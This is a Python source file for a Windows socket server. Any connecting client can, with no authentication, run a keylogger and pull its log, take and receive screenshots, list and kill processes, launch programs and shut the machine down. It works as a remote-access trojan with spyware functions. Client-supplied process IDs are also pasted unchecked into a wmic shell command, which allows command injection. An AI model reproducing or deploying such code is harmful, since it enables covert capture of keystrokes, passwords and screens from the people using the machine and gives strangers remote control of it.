import socket
import threading
import os
import pyautogui
import time
import subprocess
import logging
from pynput import keyboard

# Commands
CMD_END_CONNECTION = 'end_connection'
CMD_SHUTDOWN = 'shutdown'
CMD_TAKE_SCREENSHOT = 'screenshot'
CMD_VIEW_PROCESSES = 'view_processes'
CMD_KILL_PROCESS = 'kill_process'
CMD_START_KEYLOGGER = 'start_keylogger'
CMD_STOP_KEYLOGGER = 'stop_keylogger'
CMD_PRINT_KEYLOGGER = 'print_keylogger'
CMD_VIEW_APPS = 'view_apps'
CMD_START_APP = 'start_app'

# FLAGS
FLAG_FILE_END = 'FILE_END'
FLAG_PROCESSES_END = 'PROCESSES_END'
FLAG_APPS_END = 'APPS_END'

# BUFFER
BUFFER_SIZE = 1024

# TMP
TMP_PATH = os.path.join(os.getcwd(), 'tmp')


#LOGGING
logging.basicConfig(filename = (os.path.join(TMP_PATH, "keylog.txt")), level=logging.DEBUG, format='%(asctime)s: %(message)s')


class Server:
  def __init__(self):
    self.host = socket.gethostbyname_ex(socket.gethostname())[2][2]
    self.port = 5000
    self.addr = (self.host, self.port)
    self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    self.server.bind(self.addr)
    self.keylogger_listener = None

  def run(self):
    self.server.listen(5)
    print(f'Server is listening on {self.host}:{self.port}')
    while True:
        conn, addr = self.server.accept()
        thread = threading.Thread(target=self.handle_client, args=(conn, addr), daemon=True)
        thread.start()

  # Handle client connection
  def handle_client(self, conn, addr):
    lock = 0
    print(f"[NEW CONNECTION] {addr} connected.")
    connected = True
    try:
      while connected:
        data = conn.recv(BUFFER_SIZE)

        # End connection
        if data == CMD_END_CONNECTION.encode():
          break

        # Shutdown
        elif data == CMD_SHUTDOWN.encode():
          print(f'[SHUTDOWN] {addr} requested shutdown.')
          self.shutdown(conn, addr)

        # Take screenshot
        elif data == CMD_TAKE_SCREENSHOT.encode():
          print(f'[SCREENSHOT] {addr} requested screenshot.')
          self.take_screenshot()
          self.send_file(os.path.join(TMP_PATH, 'screenshot.png'), conn)
          print(f'[SCREENSHOT] {addr} sent screenshot.')

        # View processes
        elif data == CMD_VIEW_PROCESSES.encode():
          print(f'[PROCESSES] {addr} requested processes.')
          processes = self.get_all_processes()
          conn.send(processes.encode())
          time.sleep(0.01)
          conn.send(FLAG_PROCESSES_END.encode())
          print(f'[PROCESSES] {addr} sent processes.')          

        # Kill process
        elif data == CMD_KILL_PROCESS.encode():
          print(f'[KILL] {addr} requested kill process/app.')
          pid = conn.recv(BUFFER_SIZE).decode()
          self.kill_process(pid)
          print(f'[KILL] {addr} killed process/app.')

        # Start keylogger
        elif data == CMD_START_KEYLOGGER.encode():
          if lock == 0:
            print(f'[KEYLOGGER] {addr} requested start keylogger.')
            self.start_keylogger()
            lock += 1
            print(f'[KEYLOGGER] {addr} started keylogger.')
          else:
            print(f'[KEYLOGGER] {addr} requested start keylogger, but keylogger is already running.')
            # conn.send('Keylogger is already running.'.encode())

        # Stop keylogger
        elif data == CMD_STOP_KEYLOGGER.encode():
          if lock == 1:
            print(f'[KEYLOGGER] {addr} requested stop keylogger.')
            self.stop_keylogger()
            lock -= 1
            print(f'[KEYLOGGER] {addr} stopped keylogger.')
          else:
            print(f'[KEYLOGGER] {addr} requested stop keylogger, but keylogger is not running.')
            # conn.send('Keylogger is not running.'.encode())

        # Print keylogger
        elif data == CMD_PRINT_KEYLOGGER.encode():
          print(f'[KEYLOGGER] {addr} requested print keylogger.')
          self.send_file(os.path.join(TMP_PATH, 'keylog.txt'), conn)
          print(f'[KEYLOGGER] {addr} sent keylogger.')

        # View apps
        elif data == CMD_VIEW_APPS.encode():
          print(f'[APPS] {addr} requested view apps.')
          apps = self.get_all_apps()
          conn.send(apps.encode())
          time.sleep(0.01)
          conn.send(FLAG_APPS_END.encode())
          print(f'[APPS] {addr} sent apps.')

        # Start app
        elif data == CMD_START_APP.encode():
          print(f'[APP] {addr} requested start app.')
          app_name = conn.recv(BUFFER_SIZE).decode()
          self.start_app(str(app_name))
          print(f'[APP] {addr} started app.')

      conn.close()
      print(f"[DISCONNECTED] {addr} disconnected.")

    except ConnectionResetError:
      print(f"[DISCONNECTED] {addr} disconnected.")
      conn.close()
    except socket.error:
      print(f"[DISCONNECTED] {addr} disconnected.")
      conn.close()
      
  def shutdown(self, conn, addr):
    conn.close()
    os.system('shutdown -s -t 0')
    
  def take_screenshot(self):
    screenshot = pyautogui.screenshot()
    screenshot.save(os.path.join(TMP_PATH, 'screenshot.png'))
  
  def send_file(self, path, conn):
    if os.path.exists(path):
      f = open(path, 'rb')
      bytes = f.read(BUFFER_SIZE)
      while bytes:
        conn.send(bytes)
        bytes = f.read(BUFFER_SIZE)
      time.sleep(0.05)
      f.close()
      conn.send(FLAG_FILE_END.encode())

  def get_all_processes(self):
    return os.popen('wmic process get description, processid, threadcount').read()

  def kill_process(self, pid):
    # os.system(f'TASKKILL /f /t /PID {pid}')
    os.popen('wmic process where processid=' + pid + ' call terminate')

  def on_press(self, key):
    # with open(os.path.join(TMP_PATH, 'keylog.txt'), 'a') as f:
    # # Special charactersa
    #   if key == keyboard.Key.enter:
    #     key = '\n'
    #   if key == keyboard.Key.space:
    #     key = ' '
    #   if key == keyboard.Key.tab:
    #     key = '\t'
    #   if key == keyboard.Key.shift:
    #     key = '<shift>'
    #   if key == keyboard.Key.backspace:
    #     key = '<backspace>'
    #   if key == keyboard.Key.esc:
    #     key = '<esc>'
    #   if key == keyboard.Key.ctrl:
    #     key = '<ctrl>'

    #   key = str(key).replace("'", '')

    #   f.write(str(key))
    logging.info(str(key))

  def start_keylogger(self):
    print("Running keylogger...")
    self.keylogger_listener = keyboard.Listener(on_press=self.on_press)
    self.keylogger_listener.start()
   
  def stop_keylogger(self):
    print("Stopping keylogger...")
    self.keylogger_listener.stop()

  def get_all_apps(self):
    cmd = 'powershell "gps | where {$_.MainWindowTitle } | select ProcessName, Id'
    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
    apps = ""
    for line in proc.stdout:
      if line.rstrip():
        # only print lines that are not empty
        # decode() is necessary to get rid of the binary string (b')
        # rstrip() to remove `\r\n`
        apps += line.decode().rstrip()
        apps += "\n"
    return apps

  def start_app(self, app_name):
    os.startfile(app_name)

if __name__ == '__main__':
  server = Server()
  server.run()